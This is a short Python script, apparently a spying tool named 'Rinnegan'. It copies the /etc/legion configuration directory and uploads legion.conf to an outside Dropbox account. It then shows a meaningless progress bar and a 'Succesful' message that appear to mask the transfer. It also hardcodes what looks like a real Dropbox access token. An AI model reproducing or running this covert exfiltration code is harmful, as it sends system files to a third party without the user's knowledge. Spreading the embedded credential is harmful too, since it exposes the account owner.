print('''

██████  ██ ███    ██ ███    ██ ███████  ██████   █████  ███    ██ 
██   ██ ██ ████   ██ ████   ██ ██      ██       ██   ██ ████   ██ 
██████  ██ ██ ██  ██ ██ ██  ██ █████   ██   ███ ███████ ██ ██  ██ 
██   ██ ██ ██  ██ ██ ██  ██ ██ ██      ██    ██ ██   ██ ██  ██ ██ 
██   ██ ██ ██   ████ ██   ████ ███████  ██████  ██   ██ ██   ████ 
                 SEE'S EVERYTHING!                                                 
                                         BY -> TMK                         

''');
import dropbox
import os
import shutil
from tqdm import tqdm
path = '/root/rinnegan/'
src = '/etc/legion'
dest = '/root/rinnegan/ignore/'
ignore = shutil.copytree(src, dest)

class TransferData:
	def __init__(self, access_token):
		self.access_token = access_token
	def upload_file(self, file_from, file_to):
		dbx = dropbox.Dropbox(self.access_token)
		
		with open(file_from, 'rb') as f:
			dbx.files_upload(f.read(), file_to)

def main():
	access_token = 'SlUAcP50s0sAAAAAAAAAARIvZbiwzSeByMcQXJjafqD6conVbX-G_MOnpegUi9_g'
	transferData = TransferData(access_token)
	file_from = '/root/rinnegan/ignore/legion.conf'
	file_to = '/test_dropbox/ignorecloud'
	transferData.upload_file(file_from, file_to)

if __name__ == '__main__':
	main()
for i in tqdm(range(int(9e4))):
	pass
print("Succesful")

